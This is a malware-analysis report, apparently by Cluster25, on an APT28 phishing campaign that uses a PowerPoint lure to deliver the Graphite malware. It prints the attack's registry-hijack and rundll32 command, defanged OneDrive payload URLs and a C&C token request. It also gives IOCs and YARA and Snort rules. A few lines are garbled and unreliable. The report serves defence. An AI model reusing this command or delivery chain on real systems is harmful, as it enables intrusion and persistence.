This is a threat group attributed to Russia’s Main Intelligence Directorate of the Russian\nGeneral Staff by a July 2018 U.S. Department of Justice indictment. The lure document is a PowerPoint file that exploits a code execution\n\n\n-----\n\ntec que, c s des g ed to be t gge ed e t e use sta ts t e p ese tat o ode a d o es t e ouse e code e ecut o u s a\nPowerShell script that downloads and executes a dropper from OneDrive. The latter downloads a payload that extracts and injects in itself a\nnew PE (Portable Executable) file, that the analysis showed to be a variant of a malware family known as Graphite, that uses the Microsoft\nGraph API and OneDrive for C&C communications.\n\n## INSIGHTS\n\nAccording to lure document metadata, attackers used a template potentially linked to The Organisation for Economic Co-operation and\nDevelopment (OECD). This organization works together with governments, policy makers and citizens in order to establish evidence-based\ninternational standards and finding solutions to a range of social, economic and environmental challenges. This is a PowerPoint file (PPT)\ncontaining two slides with the same content, the first one written in English and the second in French. The document shows instructions about\nthe use of the Interpretation option available in Zoom.\n\n_Lure document content_\n\nThis PowerPoint exploits a code execution technique that is triggered by using Hyperlinks instead of Run Program / Macro, which is designed\nto be triggered when the user starts the presentation mode and moves the mouse. The code that is executed is a PowerShell script shown\nbelow, which is run through the utility SyncAppvPublishingServer, and performs the download of a file from OneDrive with a JPEG extension\n(DSC0002.jpeg). This in turn is a DLL file that is later decrypted and written to the local path C:\\ProgramData\\lmapi2.dll.\n\n_PowerShell Script_\n\n\n-----\n\ne u U used to do oad t e s epo ted be o\n\n**URL**\n\n_https[:]\\\\9b5uja[.]am[.]files[.]1drv[.]com/y4mpYJ245I931DUGr7BV-_\n_dwLD7SReTqFr1N7eQOKSH_ug2G18Jd6i3SRqYqgugj3FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-_\n_5xYgm6zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wmn8_qRmYejLgbNoQmPTUe3P5NKFFLRjeeU_JhvA/DSC0002.jpeg?download_\n\nThe execution triggers the setting of the following registry key with the value C:\\ProgramData\\lmapi2.dll to achieve persistence.\n\n**REG KEY**\n\n_HKCU\\Software\\Classes\\CLSID\\{2735412E-7F64-5B0F-8F00-5D77AFBE261E}\\InProcServer32_\n\nand the execution of the downloaded DLL via the tool rundll32.exe.\n\nThe following syntax is responsible to perform the whole set of operations:\n\n**COMMAND**\n\n_/c reg ADD HKCU\\Software\\Classes\\CLSID\\{2735412E-7F64-5B0F-8F00-5D77AFBE261E}\\InProcServer32 /t_\n\n_REG_SZ /d C:\\ProgramData\\lmapi2.dll /ve /f /reg:64 && rundll32.exe C:\\ProgramData\\lmapi2.dll,#1_\n\nThe DLL file lmapi2.dll is a 64-bit PE file with the compiler timestamp Mon Jan 17 08:10:01 2022 | UTC. It creates a new thread, in which a\nnew mutex is created with the name 56rd68kow. If the mutex doesn’t already exists, the malware makes another request to OneDrive using\nthe following URL:\n\n**URL**\n\n_https[:]//kdmzlw[.]am[.]files[.]1drv[.]com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qymWyCbPrkKO_\n_download\"_\n\nA new file, again with a JPEG extension (DSC0001.jpeg), is downloaded and decrypted using the RSA and AES Cryptographic Provider from\nWinCrypt APIs, with a hardcoded public key. Then, the malware dynamically calls the API NtAllocateVirtualMemory and then writes and\nexecutes the decrypted content in the newly allocated memory region. Similarly, the imported code dynamically calls VirtualAlloc to allocate a\nnew region of memory in which a new PE file is copied. Finally, it passes the execution to the region of memory in which the copied PE is\nallocated, as evidence reported following:\n\nThe code in the injected PE creates another mutex having the name 42Htb600y. The malware proceeds to de-obfuscate strings using a XOR\nloop and using a different XOR key for each string.

Hence, the analysis showed that the\nsample in question is a version of the Graphite malware, a malware using the Microsoft Graph API and OneDrive for C&C communications.\nThe malware is known to be deployed in-memory only and served as a downloader for the post-exploitation frameworks like Empire (as\n\n\n-----\n\ndocu e ted by e esea c e s o ea y 0 [e e)](https://www.trellix.com/en-us/about/newsroom/stories/research/prime-ministers-office-compromised.html) o obta a e O ut to e to access t e se ce, t e e dpo t\nlogin[.]microsoftonline[.]com/common/oauth2/v2.0/token is contacted using a fixed client ID (62272a08-fe9d-4825-bc65-203842ff92bc), as\nevidence below:\n\nThe following is the full HTTP request to make the first connection to the C&C.\n\n**HTTP REQUEST**\n\n_POST https://login.microsoftonline.com/common/oauth2/v2.0/token HTTP/1.1_\n\n_User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR_\n_Content-Type: application/x-www-form-urlencoded_\n\n_Host: login.microsoftonline.com_\n\n_Content-Length: 459_\n\n_Connection: Keep-Alive_\n\n_Cache-Control: no-cache_\n\n_client_id=62272a08-fe9d-4825-bc65-_\n\n_203842ff92bc&redirect_uri=urn:ietf:wg:oauth:2.0:oob&refresh_token=M.R3_BAY.-_\n\n_CVmbPSAFzt2n5JiYAwjQRpC6Yh*f45Zsz9XKTHMo4G1ZeR0UDVRbJhp8T7Df*ARh8tTfRKRZZ8YzFEYMRJ!VPP!GJPZsfeTb0SMIF!gXQ0sUli*g_\n\nOnce obtained a new OAuth2 token, the Graphite malware will query the Microsoft GraphAPIs for new commands by enumerating the child\nfiles in the check OneDrive subdirectory. If a new file is found, the content is downloaded and decrypted through an AES-256-CBCdecryption\nalgorithm. The monitoring of task executions and the uploading of their results is managed through a dedicated thread. Finally, the malware\nallows remote command execution by allocating a new region of memory and executing the received shellcode by calling a new dedicated\nthread.\n\n## CONCLUSIONS\n\nAccording to extracted metadata, attackers worked on the preparation of the campaign between January and February 2022. However, both\nURLs used by attackers appared active even recently (Q3 2022). In addition could be interesting to note that, according to the visibility we can\ndispose of, limited telemetry hits related to the collected artifacts have been catched on 25/08/2022 and 09/09/2022 from two countries of the\nEuropean Union (we have no data available before 25/08/2022).\n\nSuch recent evidence could suggest some sort of activities still ongoing linked to the described threat or to some of its variants. Finally, based\non several indicators, geopolitical objectives and the analyzed artifacts, Cluster25 attributes this campaign to the Russia-linked threat actor\nknown as APT28 (aka Fancy Bear, TSAR Team, Pawn Storm, Sednit) and indicates entities and individuals operating in the defense and\ngovernment sectors of Europe and Eastern Europe countries as potential targets.\n\n## ATT&CK MATRIX\n\n**TACTIC** **TECHNIQUE** **DESCRIPTION**\n\nInitial Access T1566.001 Phishing: Spearphishing Attachment\n\n\n-----\n\nExecution T1059.001 Command and Scripting Interpreter: PowerShell\n\nExecution T1106 Native API\n\nExecution T1204.002 User Execution: Malicious File\n\nPersistence T1546.015 Event Triggered Execution: Component Object Model Hijacking\n\nPrivilege Escalation T1546.015 Event Triggered Execution: Component Object Model Hijacking\n\nDefense Evasion T1140 Deobfuscate/Decode Files or Information\n\nDefense Evasion T1202 Indirect Command Execution\n\nDefense Evasion T1036.005 Masquerading: Match Legitimate Name or Location\n\nDefense Evasion T1112 Modify Registry\n\nDefense Evasion T1027 Obfuscated Files or Information\n\nDefense Evasion T1055.001 Process Injection: Dynamic-link Library Injection\n\nDiscovery T1082 System Information Discovery\n\nCommand & Control T1071.001 Application Layer Protocol: Web Protocols\n\n## INDICATORS OF COMPROMISE\n\n**CATEGORY** **TYPE** **VALUE**\n\nPAYLOAD MD5 c0060c0741833af67121390922c44f91\n\nPAYLOAD SHA1 622eb93e34445c752eeaa623ef9ac6978e58f2fc\n\n\nPAYLOAD\nSHA256\n\n\nd1bceccf5d2b900a6b601c612346fdb3fa5bb0e2faeefcac3f9c29dc1d74838d\n\n\nPAYLOAD MD5 ef1288de782e65d6e5bd6a327157988f\n\nPAYLOAD SHA1 a23efb6aa5a242c61c5d50a967a8f29da164c954\n\n\nPAYLOAD\nSHA256\n\n\nbe180a7c43734b7125b2d5cea7edd0174811a58113b048f5fe687db52db47fe3\n\n\nPAYLOAD MD5 2ff3e6c9244ef965295aa60879d1aa6b\n\nPAYLOAD SHA1 4c813ad68f2f1da6b2c59d11ad983cfa65e1a187\n\n\nPAYLOAD\nSHA256\n\n\nefa5b49bdd086125b2b7d4058d09566f1db5f183c2a6332c597322f85107667a\n\n\nPAYLOAD MD5 9a915313d02345e149e6ba566fe85c47\n\nPAYLOAD SHA1 9cd7f14d85814c48be3fbf73891415978a7aa882\n\n\nPAYLOAD\nSHA256\n\n\nNETWORK\n\nNETWORK\n\nNETWORK\n\nNETWORK\n\n\nDOMAIN\n\nDOMAIN\n\n\nURL https[:]\\\\9b5uja[.]am[.]files[.]1drv[.]com/y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_ug2G18Jd6i3SRqYqgu\ndownload\n\nURL https[:]//kdmzlw[.]am[.]files[.]1drv[.]com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh\ndownload\"\n\n\n34aca02d3a4665f63fddb354551b5eff5a7e8877032ddda6db4f5c42452885ad\n\n9b5uja[.]am[.]files[.]1drv.com\n\nkdmzlw[.]am[.]files[.]1drv[.]com\n\n\n## DETECTION AND THREAT HUNTING\n\n**SNORT**\n\n\n-----\n\n```\nalert tcp any any -> any any (\nmsg:\"Cluster25 APT28 Graphite CnC Communication via\nclient_id\";\ncontent:\"POST\";\nhttp_method;\ncontent:\"client_id=62272a08-fe9d-4825-bc65-203842ff92bc\";\nhttp_client_body;\nfast_pattern;\nsid:10001;\n)\n\n```\n**YARA**\n```\nrule Powerpoint_Code_Execution_87211_00007 {\nmeta:\nauthor = \"Cluster25\"\ndescription =\"Detects Code execution technique in Powerpoint (Hyperlink and\nAction)\"\nhash1 = \"d1bceccf5d2b900a6b601c612346fdb3fa5bb0e2faeefcac3f9c29dc1d74838d\"\nstrings:\n$magic = {D0 CF 11 E0 A1 B1 1A E1}\n$s1 = \"local.lnk\" fullword wide\n$s2 = \"lmapi2.dll\" fullword wide\n$s3 = \"rundll32.exe\" fullword wide\n$s4 = \"InProcServer32\" fullword wide\n$s5 = \"DownloadData\" fullword wide\n$s6 = \"SyncAppvPublishingServer\" fullword wide\ncondition: ($magic at 0) and (all of ($s*)) and filesize < 10MB\n}\n\n```\n**YARA**\n```\nrule APT28_Graphite_62333_00028 : RUSSIAN THREAT GROUP {\nmeta:\ndescription = \"Detects Fancy Bear Graphite variant through internal strings\"\nauthor = \"Cluster25\"\ntlp = \"white\"\nhash1 = \"34aca02d3a4665f63fddb354551b5eff5a7e8877032ddda6db4f5c42452885ad\"\nstrings:\n$ = \"_LL_x64.dll\" fullword ascii\n$ = \"qqhqx!iwwU1ptzd1WngCv9BCmVtxgFTJBPR1bJ2Ze17e0N6W3VHZC2FQOOUhu4nQ2Wrj0qLEBowQ$$\"\nascii\n$ = \"62272a08-fe9d-4825-bc65-203842ff92bc\" fullword ascii\n$ = \"%s %04d sp%1d.%1d %s\" fullword ascii\ncondition:\nuint16(0) == 0x5a4d and\nfilesize < 100KB and\nall of them\n}\n\n```\n\n-----",
